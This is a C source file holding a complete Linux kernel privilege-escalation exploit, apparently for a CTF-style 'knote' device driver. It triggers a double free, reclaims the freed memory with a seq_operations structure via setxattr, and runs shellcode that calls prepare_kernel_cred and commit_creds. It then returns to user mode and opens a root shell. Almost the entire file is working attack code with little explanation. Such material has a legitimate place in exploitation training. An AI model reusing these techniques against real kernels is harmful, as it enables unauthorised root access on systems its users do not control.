#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/xattr.h>
#include <unistd.h>

int dev, seq_fd;

/* Module structs */
// sizeof(struct knote) == 0x20
struct knote {
  char *data;
  size_t len;
  void (*encrypt_func)(char *, size_t);
  void (*decrypt_func)(char *, size_t);
};

typedef struct knote_user {
  unsigned long idx;
  char *data;
  size_t len;
} knote_user_t;

enum knote_ioctl_cmd {
  KNOTE_CREATE = 0x1337,
  KNOTE_DELETE = 0x1338,
  KNOTE_READ = 0x1339,
  KNOTE_ENCRYPT = 0x133a,
  KNOTE_DECRYPT = 0x133b
};

struct knote *knotes[10];

/* Helper functions */
void debug() {
  puts("[+] Halted execution");
  getchar();
}

void print_dump(unsigned long *data, int len) {
  for (int i = 0; i < len; ++i) {
    printf("%d: %lx\n", i, data[i]);
  }
}

void open_dev() {
  dev = open("/dev/knote", O_RDONLY);
  puts("[+] Interacting with device");
}

void kcreate(unsigned long idx, char *data, size_t len) {
  knote_user_t note = {.idx = idx, .data = data, .len = len};
  ioctl(dev, KNOTE_CREATE, &note);
}

void kdelete(unsigned long idx) {
  knote_user_t note = {
      .idx = idx,
  };
  ioctl(dev, KNOTE_DELETE, &note);
}

void kread(unsigned long idx, char *data, size_t len) {
  knote_user_t note = {.idx = idx, .data = data, .len = len};
  ioctl(dev, KNOTE_READ, &note);
}

void bak() {
  __asm__ volatile(
      ".intel_syntax noprefix;"
      "mov bak_cs, cs;"
      "mov bak_ss, ss;"
      "mov bak_rsp, rsp;"
      "pushf;"
      "pop bak_rflags;"
      ".att_syntax;");
  puts("[+] Registers backed up");
}

void bin_sh() {
  printf("[+] uid: %d\n", getuid());
  close(seq_fd);
  system("/bin/sh");
}

/* Backup registers */
unsigned long bak_cs, bak_rflags, bak_ss, bak_rsp, bak_rip;
unsigned long bak_rip = (unsigned long)bin_sh;

void shellcode() {
  __asm__ volatile(
      ".intel_syntax noprefix;"
      "mov rdi, 0;"
      "movabs rbx, 0xffffffff81053c50;"  // prepare_kernel_cred
      "call rbx;"
      "mov rdi, rax;"
      "movabs rbx, 0xffffffff81053a30;"  // commit_creds
      "call rbx;"
      "swapgs;"
      "mov r15, bak_ss;"
      "push r15;"
      "mov r15, bak_rsp;"
      "push r15;"
      "mov r15, bak_rflags;"
      "push r15;"
      "mov r15, bak_cs;"
      "push r15;"
      "mov r15, bak_rip;"
      "push r15;"
      "iretq;"
      ".att_syntax;");
}

/* Exploit */
int main() {
  char buf[10];
  bak();
  open_dev();

  /**
    knotes[ku.idx] = kmalloc(sizeof(struct knote), GFP_KERNEL);
    knotes[ku.idx]->data = data;
    knotes[ku.idx]->len = kmalloc(ku.len, GFP_KERNEL);
[1] if "ku.data" are a invalid address, the copy_from_user will fail
    if (copy_from_user(knotes[ku.idx]->data, ku.data, ku.len)) {
[2] kmalloc's are freed, but pointers not are wiped we can
[3] call DELETE in sequence and trigger a double free
      kfree(knotes[ku.idx]->data);
      kfree(knotes[ku.idx]);
      mutex_unlock(&knote_ioctl_lock);
      return -EFAULT;
    }
  */
  kcreate(0, (void *)0xdeadbeef, 0x20);
  kdelete(0);

  // seq_operations
  seq_fd = open("/proc/self/stat", O_RDONLY);

  /* Consume free entry */
  open("/proc/self/stat", O_RDONLY);

  void *shellcode_ptr = &shellcode;
  setxattr("/proc/self/stat", "exploit", &shellcode_ptr, 0x20, 0);
  read(seq_fd, buf, 1);
  return 0;
}